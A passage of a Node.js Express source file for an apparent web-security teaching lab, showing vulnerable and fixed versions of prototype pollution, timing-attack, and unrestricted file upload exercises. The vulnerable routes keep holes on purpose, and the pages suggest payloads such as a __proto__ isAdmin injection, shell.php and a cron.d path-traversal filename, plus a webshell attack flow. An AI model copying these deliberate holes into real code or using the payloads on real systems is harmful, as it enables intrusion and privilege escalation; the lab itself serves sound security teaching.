  unsafeMerge(config, userInput);

  // Check if prototype was polluted
  const emptyObj = {};
  const pollutedKeys = Object.keys(userInput.__proto__ || userInput["__proto__"] || {});
  const isPolluted = pollutedKeys.some((k) => emptyObj[k] !== undefined && !(k in {}));

  // Simulate an authorization check
  const user = { name: "regular_user" };
  const hasAdmin = user.isAdmin;

  res.type("html").send(`
    <h3>Merge Result</h3>
    <p>Config after merge:</p>
    <pre ${PRE}>${escapeHtml(JSON.stringify(config, null, 2))}</pre>

    <h3>Pollution Check</h3>
    <p>New empty object <code>{}.isAdmin</code> = <code>${escapeHtml(String(emptyObj.isAdmin))}</code></p>
    ${hasAdmin
      ? `<p style="color:red;font-weight:bold;">&#9888; Prototype polluted! A plain user object now has <code>isAdmin: ${escapeHtml(String(hasAdmin))}</code></p>
         <p>Any authorization check like <code>if (user.isAdmin)</code> is now bypassed for ALL users.</p>`
      : `<p style="color:green;">Prototype not polluted (try the <code>__proto__</code> payload above).</p>`}
  `);
});

app.get("/proto-pollution-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 41b: Prototype Pollution (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Same merge operation, but dangerous keys are filtered:</p>
    <form id="ppform">
      <textarea id="ppinput" rows="6" cols="50">{"__proto__": {"isAdmin": true}}</textarea><br><br>
      <button type="submit">Merge Config</button>
    </form>
    <div id="result"></div>
    <hr>

    <script>
      document.getElementById("ppform").addEventListener("submit", async (e) => {
        e.preventDefault();
        const body = document.getElementById("ppinput").value;
        const resp = await fetch("/proto-pollution-fixed", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body
        });
        document.getElementById("result").innerHTML = await resp.text();
      });
    </script>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#608b4e;">// Safe merge — blocks __proto__, constructor, prototype</span>
<span style="color:#c586c0;">function</span> <span style="color:#dcdcaa;">safeMerge</span>(target, source) {
  <span style="color:#c586c0;">for</span> (<span style="color:#9cdcfe;">const</span> key <span style="color:#c586c0;">in</span> source) {
    <span style="color:#c586c0;">if</span> (key === <span style="color:#ce9178;">"__proto__"</span> || key === <span style="color:#ce9178;">"constructor"</span> || key === <span style="color:#ce9178;">"prototype"</span>) <span style="color:#c586c0;">continue</span>;
    <span style="color:#c586c0;">if</span> (<span style="color:#569cd6;">typeof</span> source[key] === <span style="color:#ce9178;">"object"</span>) {
      <span style="color:#c586c0;">if</span> (!target[key]) target[key] = {};
      safeMerge(target[key], source[key]);
    } <span style="color:#c586c0;">else</span> {
      target[key] = source[key];
    }
  }
}</code></pre>

    <details>
      <summary><strong>How does this fix it?</strong></summary>
      <p>The fix skips <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code>
         keys during merge. These are the only keys that can reach the prototype chain.</p>
      <p>Better alternatives:</p>
      <ul>
        <li>Use <code>Object.create(null)</code> for config objects (no prototype)</li>
        <li>Use <code>Map</code> instead of plain objects</li>
        <li>Use <code>Object.freeze(Object.prototype)</code> to prevent modifications</li>
        <li>Use a safe merge library that handles this (e.g., lodash ≥4.17.12)</li>
      </ul>
    </details>
  `);
});

app.post("/proto-pollution-fixed", (req, res) => {
  const config = { theme: "light", lang: "en" };
  const userInput = req.body;

  safeMerge(config, userInput);

  const emptyObj = {};
  const user = { name: "regular_user" };

  res.type("html").send(`
    <h3>Merge Result</h3>
    <p>Config after merge:</p>
    <pre ${PRE}>${escapeHtml(JSON.stringify(config, null, 2))}</pre>

    <h3>Pollution Check</h3>
    <p>New empty object <code>{}.isAdmin</code> = <code>${escapeHtml(String(emptyObj.isAdmin))}</code></p>
    <p><code>user.isAdmin</code> = <code>${escapeHtml(String(user.isAdmin))}</code></p>
    <p style="color:green;font-weight:bold;">&#10004; Prototype is clean. The <code>__proto__</code> key was skipped during merge.</p>
  `);
});

/* ========================================================================
   LAB 42 — Timing Attack on String Comparison (CWE-208)
   ======================================================================== */
app.use("/timing-attack", express.urlencoded({ extended: true }));
app.use("/timing-attack-fixed", express.urlencoded({ extended: true }));

const TIMING_SECRET = crypto.randomBytes(16).toString("hex");

app.get("/timing-attack", (req, res) => {
  res.type("html").send(`
    <h1>Lab 42a: Timing Attack — Unsafe Comparison (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Guess the API secret key. The server uses <code>===</code> to compare — each correct character
       takes slightly longer, leaking information through response time.</p>
    <form method="post">
      <label>API Key guess: <input type="text" name="guess" value="" size="40" placeholder="try different lengths..."></label><br><br>
      <button type="submit">Verify</button>
    </form>
    <p class="info">Secret length: ${TIMING_SECRET.length} chars (hex). In a real attack, even the length is unknown.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#608b4e;">// Vulnerable: === exits on first mismatch</span>
<span style="color:#c586c0;">function</span> <span style="color:#dcdcaa;">checkKey</span>(input, secret) {
  <span style="color:#c586c0;">if</span> (input.length !== secret.length) <span style="color:#c586c0;">return</span> <span style="color:#569cd6;">false</span>;
  <span style="color:#c586c0;">for</span> (<span style="color:#9cdcfe;">let</span> i = <span style="color:#b5cea8;">0</span>; i &lt; input.length; i++) {
    <span style="color:#c586c0;">if</span> (input[i] !== secret[i]) <span style="color:#c586c0;">return</span> <span style="color:#569cd6;">false</span>; <span style="color:#608b4e;">// &#9888; early exit!</span>
  }
  <span style="color:#c586c0;">return</span> <span style="color:#569cd6;">true</span>;
}

<span style="color:#608b4e;">// Equivalent to: input === secret</span>
<span style="color:#608b4e;">// Both leak timing info — the more correct chars, the longer it takes.</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker sends guesses and measures response time (microseconds)</li>
      <li>A guess with the correct first character takes slightly longer (one more loop iteration)</li>
      <li>Attacker brute-forces character by character: 16×32 guesses for a 32-char hex key instead of 16<sup>32</sup></li>
      <li>Time complexity drops from O(n<sup>k</sup>) to O(n×k) — from impossible to trivial</li>
    </ol>

    <details>
      <summary><strong>Why is this dangerous?</strong></summary>
      <p>The <code>===</code> operator (and any loop with early exit) returns <code>false</code>
         as soon as a mismatch is found. This means correct prefixes take measurably longer
         than wrong ones. Over many requests, statistical analysis can recover the secret
         one byte at a time.</p>
      <p>This attack works on: API keys, HMAC signatures, CSRF tokens, password reset tokens,
         and any secret compared with <code>===</code> or manual loops.</p>
    </details>
  `);
});

app.post("/timing-attack", (req, res) => {
  const guess = req.body.guess || "";

  // Vulnerable: early-exit comparison with artificial delay to make timing visible
  const start = process.hrtime.bigint();
  let match = true;
  if (guess.length !== TIMING_SECRET.length) {
    match = false;
  } else {
    for (let i = 0; i < guess.length; i++) {
      // Artificial 0.1ms delay per matching char to make the timing difference visible in a demo
      if (guess[i] === TIMING_SECRET[i]) {
        const wait = process.hrtime.bigint() + 100000n; // 0.1ms
        while (process.hrtime.bigint() < wait) { /* busy wait */ }
      } else {
        match = false;
        break; // Early exit — leaks position of first mismatch
      }
    }
  }
  const elapsed = Number(process.hrtime.bigint() - start) / 1e6;

  // Count matching prefix length
  let correctPrefix = 0;
  for (let i = 0; i < Math.min(guess.length, TIMING_SECRET.length); i++) {
    if (guess[i] === TIMING_SECRET[i]) correctPrefix++;
    else break;
  }

  res.type("html").send(`
    <h1>Lab 42a: Timing Attack — Result (Vulnerable)</h1>
    <p><a href="/">Back to labs</a> | <a href="/timing-attack">Try again</a></p>

    <h3>Comparison Result</h3>
    <p>Your guess: <code>${escapeHtml(guess)}</code> (${guess.length} chars)</p>
    <p>Match: ${match
      ? '<span style="color:green;font-weight:bold;">YES — correct key!</span>'
      : '<span style="color:red;">NO</span>'}</p>
    <p>Response time: <strong>${elapsed.toFixed(3)} ms</strong></p>
    <p>Correct prefix length: <strong style="color:${correctPrefix > 0 ? "orange" : "red"};">${correctPrefix}</strong> characters</p>

    ${!match ? `
      <p style="color:red;">&#9888; The response time correlates with the number of correct characters.
         An attacker can measure this to brute-force the key one character at a time.</p>
      <p class="info">Hint: first 4 chars of the secret are <code>${escapeHtml(TIMING_SECRET.substring(0, 4))}...</code></p>
    ` : ""}
  `);
});

app.get("/timing-attack-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 42b: Timing Attack — Constant-Time Comparison (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Same secret, but compared with <code>crypto.timingSafeEqual()</code> — response time
       is constant regardless of how many characters match.</p>
    <form method="post">
      <label>API Key guess: <input type="text" name="guess" value="" size="40" placeholder="try different lengths..."></label><br><br>
      <button type="submit">Verify</button>
    </form>
    <p class="info">Secret length: ${TIMING_SECRET.length} chars. Try the same guesses from the vulnerable version.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#608b4e;">// Fixed: constant-time comparison</span>
<span style="color:#9cdcfe;">const</span> crypto = require(<span style="color:#ce9178;">"crypto"</span>);

<span style="color:#c586c0;">function</span> <span style="color:#dcdcaa;">safeCheckKey</span>(input, secret) {
  <span style="color:#608b4e;">// Pad to same length to avoid leaking length info</span>
  <span style="color:#9cdcfe;">const</span> a = <span style="color:#4ec9b0;">Buffer</span>.from(input.padEnd(secret.length));
  <span style="color:#9cdcfe;">const</span> b = <span style="color:#4ec9b0;">Buffer</span>.from(secret);
  <span style="color:#c586c0;">if</span> (a.length !== b.length) <span style="color:#c586c0;">return</span> <span style="color:#569cd6;">false</span>;
  <span style="color:#c586c0;">return</span> crypto.<span style="color:#dcdcaa;">timingSafeEqual</span>(a, b)
    &amp;&amp; input.length === secret.length;
}</code></pre>

    <details>
      <summary><strong>How does this fix it?</strong></summary>
      <p><code>crypto.timingSafeEqual()</code> always compares every byte, regardless of where
         mismatches occur. The comparison takes the same amount of time whether 0 or all
         characters match, making timing analysis useless.</p>
      <p>The length check uses <code>padEnd</code> to ensure both buffers are the same size
         before comparison, preventing length-based timing leaks while still rejecting
         wrong-length inputs.</p>
    </details>
  `);
});

app.post("/timing-attack-fixed", (req, res) => {
  const guess = req.body.guess || "";

  const start = process.hrtime.bigint();
  // Fixed: constant-time comparison
  let match = false;
  const padded = guess.padEnd(TIMING_SECRET.length);
  const a = Buffer.from(padded);
  const b = Buffer.from(TIMING_SECRET);
  if (a.length === b.length) {
    match = crypto.timingSafeEqual(a, b) && guess.length === TIMING_SECRET.length;
  }
  const elapsed = Number(process.hrtime.bigint() - start) / 1e6;

  // Count matching prefix (for display only — the server doesn't leak this via timing)
  let correctPrefix = 0;
  for (let i = 0; i < Math.min(guess.length, TIMING_SECRET.length); i++) {
    if (guess[i] === TIMING_SECRET[i]) correctPrefix++;
    else break;
  }

  res.type("html").send(`
    <h1>Lab 42b: Timing Attack — Result (Fixed)</h1>
    <p><a href="/">Back to labs</a> | <a href="/timing-attack-fixed">Try again</a></p>

    <h3>Comparison Result</h3>
    <p>Your guess: <code>${escapeHtml(guess)}</code> (${guess.length} chars)</p>
    <p>Match: ${match
      ? '<span style="color:green;font-weight:bold;">YES — correct key!</span>'
      : '<span style="color:red;">NO</span>'}</p>
    <p>Response time: <strong>${elapsed.toFixed(3)} ms</strong></p>

    <p style="color:green;font-weight:bold;">&#10004; Response time is constant regardless of correct prefix length.</p>
    <p>Correct prefix: ${correctPrefix} chars — but the attacker can't determine this from timing.</p>
    <p class="info">Compare the response times between this and the vulnerable version with the same inputs.
       The vulnerable version's time increases with each correct character; this one stays flat.</p>
  `);
});

/* ========================================================================
   LAB 43 — Unrestricted File Upload (CWE-434)
   ======================================================================== */

// Simulated file storage (in-memory, no actual disk writes)
const uploadedFiles = { vuln: [], fixed: [] };

// Parse multipart form data manually (no multer dependency needed)
function parseMultipart(req) {
  return new Promise((resolve, reject) => {
    const contentType = req.headers["content-type"] || "";
    const boundaryMatch = contentType.match(/boundary=(.+)/);
    if (!boundaryMatch) return reject(new Error("No boundary found"));

    const chunks = [];
    req.on("data", (chunk) => chunks.push(chunk));
    req.on("end", () => {
      const body = Buffer.concat(chunks);
      const boundary = "--" + boundaryMatch[1];
      const parts = body.toString("binary").split(boundary).slice(1, -1);
      const files = [];

      for (const part of parts) {
        const headerEnd = part.indexOf("\r\n\r\n");
        if (headerEnd === -1) continue;
        const headers = part.substring(0, headerEnd);
        const content = part.substring(headerEnd + 4).replace(/\r\n$/, "");
        const filenameMatch = headers.match(/filename="([^"]+)"/);
        const nameMatch = headers.match(/name="([^"]+)"/);
        if (filenameMatch) {
          files.push({
            fieldname: nameMatch ? nameMatch[1] : "file",
            filename: filenameMatch[1],
            content,
            size: Buffer.byteLength(content, "binary"),
          });
        }
      }
      resolve(files);
    });
    req.on("error", reject);
  });
}

app.get("/file-upload", (req, res) => {
  res.type("html").send(`
    <h1>Lab 43a: Unrestricted File Upload (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Upload a file — the server accepts anything without validation:</p>
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="file"><br><br>
      <button type="submit">Upload</button>
    </form>
    <p class="info">Try uploading: <code>shell.php</code>, <code>exploit.html</code>, <code>payload.exe</code>,
       or a file named <code>../../../etc/cron.d/backdoor</code></p>

    ${uploadedFiles.vuln.length > 0 ? `
      <h3>Uploaded Files</h3>
      <table style="border-collapse:collapse;">
        <tr><th style="padding:4px 12px;border:1px solid #ccc;">Filename</th>
            <th style="padding:4px 12px;border:1px solid #ccc;">Size</th>
            <th style="padding:4px 12px;border:1px solid #ccc;">Risk</th></tr>
        ${uploadedFiles.vuln.map((f) => {
          const ext = path.extname(f.filename).toLowerCase();
          const dangerous = [".php", ".jsp", ".exe", ".sh", ".bat", ".html", ".svg", ".js"].includes(ext);
          const traversal = f.filename.includes("..");
          return `<tr>
            <td style="padding:4px 12px;border:1px solid #ccc;"><code>${escapeHtml(f.filename)}</code></td>
            <td style="padding:4px 12px;border:1px solid #ccc;">${f.size} bytes</td>
            <td style="padding:4px 12px;border:1px solid #ccc;color:${dangerous || traversal ? "red" : "green"};">
              ${traversal ? "&#9888; PATH TRAVERSAL" : dangerous ? "&#9888; Executable/active content" : "Low risk"}
            </td></tr>`;
        }).join("")}
      </table>
    ` : ""}
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#608b4e;">// Vulnerable: no validation at all</span>
<span style="color:#9cdcfe;">const</span> filename = req.file.originalname; <span style="color:#608b4e;">// &#9888; user-controlled!</span>
<span style="color:#9cdcfe;">const</span> savePath = path.join(uploadDir, filename);
fs.writeFileSync(savePath, req.file.buffer);

<span style="color:#608b4e;">// Problems:</span>
<span style="color:#608b4e;">// 1. No extension check — .php, .jsp, .exe all accepted</span>
<span style="color:#608b4e;">// 2. No content-type validation — MIME type is user-controlled</span>
<span style="color:#608b4e;">// 3. No size limit — DoS via large uploads</span>
<span style="color:#608b4e;">// 4. Path traversal — filename "../../etc/cron.d/job" escapes upload dir</span>
<span style="color:#608b4e;">// 5. No rename — predictable filenames enable direct access</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker uploads <code>webshell.php</code> with PHP code as content</li>
      <li>Server saves it to <code>/uploads/webshell.php</code></li>
      <li>Attacker visits <code>https://target.com/uploads/webshell.php</code></li>
      <li>Web server executes the PHP — attacker has remote code execution</li>
    </ol>

    <details>
      <summary><strong>Why is this dangerous?</strong></summary>
      <ul>
        <li><strong>Remote Code Execution:</strong> upload server-side scripts (.php, .jsp, .aspx)</li>
        <li><strong>Stored XSS:</strong> upload .html or .svg with JavaScript</li>
        <li><strong>Path Traversal:</strong> filename like <code>../../config.js</code> overwrites server files</li>
        <li><strong>DoS:</strong> upload gigabyte-sized files without size limits</li>
        <li><strong>Malware distribution:</strong> serve malicious .exe from trusted domain</li>
      </ul>
    </details>
  `);
});

app.post("/file-upload", async (req, res) => {
  try {
    const files = await parseMultipart(req);
    if (files.length === 0) {
      return res.type("html").send(`
        <h1>Lab 43a: File Upload — No file received</h1>
        <p><a href="/file-upload">Try again</a></p>
      `);
    }

    const file = files[0];
    // Vulnerable: store with original filename, no validation
    uploadedFiles.vuln.push({ filename: file.filename, size: file.size });

    const ext = path.extname(file.filename).toLowerCase();
    const dangerous = [".php", ".jsp", ".exe", ".sh", ".bat", ".html", ".svg", ".js"].includes(ext);
    const traversal = file.filename.includes("..");

    res.type("html").send(`
      <h1>Lab 43a: File Upload — Result (Vulnerable)</h1>
      <p><a href="/">Back to labs</a> | <a href="/file-upload">Upload another</a></p>

      <h3>Upload Accepted</h3>
      <p>Filename: <code>${escapeHtml(file.filename)}</code></p>
      <p>Size: ${file.size} bytes</p>
      <p>Saved to: <code>/uploads/${escapeHtml(file.filename)}</code></p>

      ${traversal
        ? `<p style="color:red;font-weight:bold;">&#9888; PATH TRAVERSAL! Filename contains ".." — file could be written outside the upload directory.</p>
           <p>Resolved path: <code>${escapeHtml(path.join("/uploads", file.filename))}</code></p>`
        : ""}

      ${dangerous
        ? `<p style="color:red;font-weight:bold;">&#9888; DANGEROUS EXTENSION! <code>${escapeHtml(ext)}</code> files can execute code or scripts on the server.</p>`
        : ""}

      ${!dangerous && !traversal
        ? '<p style="color:orange;">File accepted without any validation. Even "safe" extensions can be dangerous with MIME sniffing.</p>'
        : ""}
    `);
  } catch (e) {
    res.type("html").send(`
      <h1>Lab 43a: File Upload — Error</h1>
      <p><a href="/file-upload">Try again</a></p>
      <p style="color:red;">${escapeHtml(e.message)}</p>
    `);
  }
});

app.get("/file-upload-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 43b: Restricted File Upload (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Upload a file — only safe extensions, sanitized filename, and size limits:</p>
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="file"><br><br>
      <button type="submit">Upload</button>
    </form>
    <p class="info">Allowed: .png, .jpg, .jpeg, .gif, .pdf, .txt (max 1 MB)</p>

    ${uploadedFiles.fixed.length > 0 ? `
      <h3>Uploaded Files</h3>
      <table style="border-collapse:collapse;">
        <tr><th style="padding:4px 12px;border:1px solid #ccc;">Original Name</th>
            <th style="padding:4px 12px;border:1px solid #ccc;">Saved As</th>
            <th style="padding:4px 12px;border:1px solid #ccc;">Size</th></tr>
        ${uploadedFiles.fixed.map((f) => `<tr>
          <td style="padding:4px 12px;border:1px solid #ccc;"><code>${escapeHtml(f.original)}</code></td>
          <td style="padding:4px 12px;border:1px solid #ccc;"><code>${escapeHtml(f.saved)}</code></td>
          <td style="padding:4px 12px;border:1px solid #ccc;">${f.size} bytes</td>
        </tr>`).join("")}
      </table>
    ` : ""}
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> ALLOWED_EXT = <span style="color:#9cdcfe;">new</span> <span style="color:#4ec9b0;">Set</span>([<span style="color:#ce9178;">".png"</span>, <span style="color:#ce9178;">".jpg"</span>, <span style="color:#ce9178;">".jpeg"</span>, <span style="color:#ce9178;">".gif"</span>, <span style="color:#ce9178;">".pdf"</span>, <span style="color:#ce9178;">".txt"</span>]);
<span style="color:#9cdcfe;">const</span> MAX_SIZE = <span style="color:#b5cea8;">1024</span> * <span style="color:#b5cea8;">1024</span>; <span style="color:#608b4e;">// 1 MB</span>

<span style="color:#608b4e;">// 1. Check file size</span>
<span style="color:#c586c0;">if</span> (file.size > MAX_SIZE) <span style="color:#c586c0;">return</span> reject(<span style="color:#ce9178;">"Too large"</span>);

<span style="color:#608b4e;">// 2. Extract and validate extension</span>
<span style="color:#9cdcfe;">const</span> ext = path.extname(file.originalname).toLowerCase();
<span style="color:#c586c0;">if</span> (!ALLOWED_EXT.has(ext)) <span style="color:#c586c0;">return</span> reject(<span style="color:#ce9178;">"Extension not allowed"</span>);

<span style="color:#608b4e;">// 3. Strip path components (prevent traversal)</span>
<span style="color:#9cdcfe;">const</span> baseName = path.basename(file.originalname);

<span style="color:#608b4e;">// 4. Generate random filename (prevent overwrites + direct access)</span>
<span style="color:#9cdcfe;">const</span> safeName = crypto.randomUUID() + ext;
<span style="color:#9cdcfe;">const</span> savePath = path.join(uploadDir, safeName);</code></pre>

    <details>
      <summary><strong>How does this fix it?</strong></summary>
      <ul>
        <li><strong>Extension allowlist:</strong> only known-safe types accepted</li>
        <li><strong>Size limit:</strong> prevents DoS via oversized uploads</li>
        <li><strong>path.basename():</strong> strips <code>../</code> sequences, preventing traversal</li>
        <li><strong>Random filename:</strong> prevents predictable URLs and file overwrites</li>
        <li>Additional best practices: validate MIME via magic bytes, store outside web root,
            serve via a handler that sets <code>Content-Disposition: attachment</code></li>
      </ul>
    </details>
  `);
});

app.post("/file-upload-fixed", async (req, res) => {
  const ALLOWED_EXT = new Set([".png", ".jpg", ".jpeg", ".gif", ".pdf", ".txt"]);
  const MAX_SIZE = 1024 * 1024; // 1 MB

  try {
    const files = await parseMultipart(req);
    if (files.length === 0) {
      return res.type("html").send(`
        <h1>Lab 43b: File Upload — No file received</h1>
        <p><a href="/file-upload-fixed">Try again</a></p>
      `);
    }

    const file = files[0];
    const errors = [];

    // 1. Size check
    if (file.size > MAX_SIZE) {
      errors.push(`File too large: ${file.size} bytes (max ${MAX_SIZE})`);
    }

    // 2. Extension allowlist
    const ext = path.extname(file.filename).toLowerCase();
    if (!ALLOWED_EXT.has(ext)) {
      errors.push(`Extension "${ext || "(none)"}" not allowed. Allowed: ${[...ALLOWED_EXT].join(", ")}`);
    }

    // 3. Check for double extensions (e.g. shell.php.jpg — still suspicious)
    const parts = file.filename.split(".");
    const suspiciousDoubleExt = parts.length > 2 &&
      [".php", ".jsp", ".exe", ".sh", ".bat", ".html", ".js"].includes("." + parts[parts.length - 2].toLowerCase());

    if (errors.length > 0) {
      return res.type("html").send(`
        <h1>Lab 43b: File Upload — Rejected (Fixed)</h1>
        <p><a href="/">Back to labs</a> | <a href="/file-upload-fixed">Try again</a></p>

        <p style="color:green;font-weight:bold;">&#10004; Upload rejected:</p>
        <ul>${errors.map((e) => `<li style="color:green;">${escapeHtml(e)}</li>`).join("")}</ul>
        <p>Original filename: <code>${escapeHtml(file.filename)}</code></p>
      `);
    }

    // 4. Sanitize: strip path, generate random name
    const safeName = crypto.randomUUID() + ext;
    uploadedFiles.fixed.push({ original: file.filename, saved: safeName, size: file.size });

    res.type("html").send(`
      <h1>Lab 43b: File Upload — Accepted (Fixed)</h1>
      <p><a href="/">Back to labs</a> | <a href="/file-upload-fixed">Upload another</a></p>

      <h3>Upload Accepted</h3>
      <p>Original: <code>${escapeHtml(file.filename)}</code></p>
      <p>Saved as: <code>${escapeHtml(safeName)}</code></p>
      <p>Size: ${file.size} bytes</p>

      <p style="color:green;font-weight:bold;">&#10004; File validated and renamed to prevent direct execution.</p>
      ${suspiciousDoubleExt
        ? `<p style="color:orange;">&#9888; Warning: double extension detected — may be an evasion attempt, but the final extension is safe.</p>`
        : ""}
    `);
  } catch (e) {
    res.type("html").send(`
      <h1>Lab 43b: File Upload — Error</h1>
      <p><a href="/file-upload-fixed">Try again</a></p>
      <p style="color:red;">${escapeHtml(e.message)}</p>
    `);
  }
});

/* ========================================================================
   Start server
   ======================================================================== */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Web Vuln by Example running at http://localhost:${PORT}`);
});
